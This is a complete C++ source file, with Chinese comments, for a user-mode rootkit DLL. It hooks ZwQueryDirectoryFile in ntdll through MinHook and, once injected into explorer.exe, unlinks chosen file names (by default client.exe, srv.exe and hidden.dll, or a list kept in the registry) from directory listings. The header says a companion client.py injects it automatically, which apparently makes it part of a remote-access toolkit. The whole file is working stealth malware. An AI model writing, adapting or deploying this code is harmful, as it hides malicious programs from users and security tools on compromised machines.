/*
 * hidden.cpp — Ring3 Rootkit: Hook ZwQueryDirectoryFile 隱藏檔案
 *
 * 原理：
 *   Explorer.exe 使用 ZwQueryDirectoryFile (ntdll.dll) 來列舉目錄中的檔案。
 *   Hook 此 API 後，在回傳的 FILE_DIRECTORY_INFORMATION 鏈結串列中，
 *   將目標檔案的 Entry 跳過（修改 NextEntryOffset），
 *   使 Explorer、cmd、PowerShell 都看不到該檔案。
 *
 * 隱藏目標設定：
 *   寫入 registry HKCU\Software\HiddenFiles\Targets，
 *   以 null 分隔的多個檔名（REG_MULTI_SZ），例如：
 *     client.exe\0srv.exe\0hidden.dll\0\0
 *   client.py 的 inject_hidden() 會自動寫入。
 *
 * 編譯（MSVC）：
 *   cl /LD hidden.cpp /Fe:hidden.dll /I include /link MinHook.x64.lib
 *
 * 注入方式：
 *   使用 DLL Injector 將此 DLL 注入 explorer.exe
 *   （client.py 的 inject_hidden() 會自動完成注入）
 *
 * 參考：iT 邦幫忙「現實主義勇者的 Windows 攻防記」Day 14
 *   https://ithelp.ithome.com.tw/articles/10274332
 */

#include <windows.h>
#include <winternl.h>
#include <string>
#include <vector>
#include <iostream>
#include "MinHook.h"

#pragma comment(lib, "ntdll.lib")

// 從 registry 讀取隱藏目標
// registry 路徑：HKCU\Software\HiddenFiles\Targets (REG_MULTI_SZ)
static std::vector<std::wstring> g_hideTargets;

static void LoadTargetsFromRegistry() {
    HKEY hKey = nullptr;
    LONG result = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\HiddenFiles",
        0, KEY_READ, &hKey
    );

    if (result != ERROR_SUCCESS) {
        // registry 不存在，使用預設值
        g_hideTargets = { L"client.exe", L"srv.exe", L"hidden.dll" };
        return;
    }

    // 查詢所需大小
    DWORD type = 0;
    DWORD size = 0;
    result = RegQueryValueExW(hKey, L"Targets", nullptr, &type, nullptr, &size);
    if (result != ERROR_SUCCESS || type != REG_MULTI_SZ || size == 0) {
        RegCloseKey(hKey);
        g_hideTargets = { L"client.exe", L"srv.exe", L"hidden.dll" };
        return;
    }

    // 讀取資料
    std::vector<BYTE> buffer(size + 2, 0);  // +2 for safety null terminator
    result = RegQueryValueExW(hKey, L"Targets", nullptr, &type, buffer.data(), &size);
    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        g_hideTargets = { L"client.exe", L"srv.exe", L"hidden.dll" };
        return;
    }

    // 解析 REG_MULTI_SZ（以 null 分隔的字串陣列）
    wchar_t* p = reinterpret_cast<wchar_t*>(buffer.data());
    size_t len = size / sizeof(wchar_t);
    size_t i = 0;
    while (i < len && p[i] != L'\0') {
        // 找到下一個 null
        size_t j = i;
        while (j < len && p[j] != L'\0') j++;
        g_hideTargets.push_back(std::wstring(p + i, j - i));
        i = j + 1;  // 跳過 null
    }

    if (g_hideTargets.empty()) {
        g_hideTargets = { L"client.exe", L"srv.exe", L"hidden.dll" };
    }
}

// 定義 ZwQueryDirectoryFile 的 function pointer 簽章
typedef NTSTATUS(WINAPI* PF_ZwQueryDirectoryFile)(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan
);

static PF_ZwQueryDirectoryFile fpZwQueryDirectoryFile = nullptr;

// 需要處理的 FileInformationClass
static bool IsTargetClass(FILE_INFORMATION_CLASS cls) {
    return cls == FileDirectoryInformation ||
           cls == FileFullDirectoryInformation ||
           cls == FileIdFullDirectoryInformation ||
           cls == FileBothDirectoryInformation ||
           cls == FileIdBothDirectoryInformation ||
           cls == FileNamesInformation;
}

// 取得 NextEntryOffset
static ULONG GetNextEntryOffset(PVOID pEntry) {
    return *(ULONG*)pEntry;
}

// 設定 NextEntryOffset
static void SetNextEntryOffset(PVOID pEntry, ULONG offset) {
    *(ULONG*)pEntry = offset;
}

// 從 Entry 中取得檔案名稱
static std::wstring GetEntryFileName(PVOID pEntry, FILE_INFORMATION_CLASS cls) {
    ULONG nameOffset = 0;
    ULONG nameLengthOffset = 0;

    switch (cls) {
    case FileDirectoryInformation:
        nameOffset = 0x5C;
        nameLengthOffset = 0x58;
        break;
    case FileBothDirectoryInformation:
        nameOffset = 0x60;
        nameLengthOffset = 0x5C;
        break;
    case FileFullDirectoryInformation:
        nameOffset = 0x54;
        nameLengthOffset = 0x50;
        break;
    case FileNamesInformation:
        nameOffset = 0x0C;
        nameLengthOffset = 0x08;
        break;
    default:
        return L"";
    }

    ULONG nameLength = *(ULONG*)((BYTE*)pEntry + nameLengthOffset);
    if (nameLength == 0) return L"";
    wchar_t* namePtr = (wchar_t*)((BYTE*)pEntry + nameOffset);
    return std::wstring(namePtr, nameLength / sizeof(wchar_t));
}

// 檢查檔名是否匹配任何隱藏目標（大小寫不敏感）
static bool ShouldHide(const std::wstring& fileName) {
    for (const auto& target : g_hideTargets) {
        // 轉小寫比較
        std::wstring lowerName = fileName;
        std::wstring lowerTarget = target;
        for (auto& c : lowerName) c = towlower(c);
        for (auto& c : lowerTarget) c = towlower(c);
        if (lowerName.find(lowerTarget) != std::wstring::npos) {
            return true;
        }
    }
    return false;
}

// Detour Function
NTSTATUS WINAPI DetourZwQueryDirectoryFile(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan
) {
    NTSTATUS status = fpZwQueryDirectoryFile(
        FileHandle, Event, ApcRoutine, ApcContext,
        IoStatusBlock, FileInformation, Length,
        FileInformationClass, ReturnSingleEntry,
        FileName, RestartScan
    );

    if (!NT_SUCCESS(status) || !IsTargetClass(FileInformationClass)) {
        return status;
    }

    PVOID pCurrent = FileInformation;
    PVOID pPrevious = nullptr;

    while (pCurrent != nullptr) {
        ULONG nextOffset = GetNextEntryOffset(pCurrent);
        std::wstring entryName = GetEntryFileName(pCurrent, FileInformationClass);

        if (ShouldHide(entryName)) {
            if (pPrevious == nullptr) {
                // 目標是第一個 Entry
                if (nextOffset == 0) {
                    if (IoStatusBlock) {
                        IoStatusBlock->Information = 0;
                    }
                    return STATUS_NO_MORE_FILES;
                }
                // buffer 往前移
                ULONG remaining = Length - nextOffset;
                if (remaining > 0) {
                    RtlMoveMemory(FileInformation, (BYTE*)pCurrent + nextOffset, remaining);
                }
                pCurrent = FileInformation;
                pPrevious = nullptr;
                continue;
            }
            else {
                if (nextOffset == 0) {
                    SetNextEntryOffset(pPrevious, 0);
                }
                else {
                    SetNextEntryOffset(pPrevious, nextOffset + GetNextEntryOffset(pPrevious));
                }
            }
        }
        else {
            pPrevious = pCurrent;
        }

        if (GetNextEntryOffset(pCurrent) == 0) break;
        pCurrent = (BYTE*)pCurrent + GetNextEntryOffset(pCurrent);
    }

    return status;
}

// DLL 進入點
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        {
            // 從 registry 讀取隱藏目標
            LoadTargetsFromRegistry();

            if (MH_Initialize() != MH_OK) {
                OutputDebugStringA("[hidden] MH_Initialize failed\n");
                break;
            }

            HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
            if (!hNtDll) {
                OutputDebugStringA("[hidden] Failed to get ntdll.dll handle\n");
                break;
            }

            auto pTarget = reinterpret_cast<LPVOID>(
                GetProcAddress(hNtDll, "ZwQueryDirectoryFile")
            );
            if (!pTarget) {
                OutputDebugStringA("[hidden] Failed to find ZwQueryDirectoryFile\n");
                break;
            }

            MH_STATUS hookStatus = MH_CreateHook(
                pTarget,
                reinterpret_cast<LPVOID>(&DetourZwQueryDirectoryFile),
                reinterpret_cast<LPVOID*>(&fpZwQueryDirectoryFile)
            );

            if (hookStatus != MH_OK) {
                OutputDebugStringA("[hidden] MH_CreateHook failed\n");
                break;
            }

            MH_STATUS enableStatus = MH_EnableHook(pTarget);
            if (enableStatus != MH_OK) {
                OutputDebugStringA("[hidden] MH_EnableHook failed\n");
                break;
            }

            OutputDebugStringA("[hidden] ZwQueryDirectoryFile Hook 啟用成功！\n");
        }
        break;

    case DLL_PROCESS_DETACH:
        MH_DisableHook(MH_ALL_HOOKS);
        MH_Uninitialize();
        OutputDebugStringA("[hidden] Hook 已移除\n");
        break;
    }
    return TRUE;
}
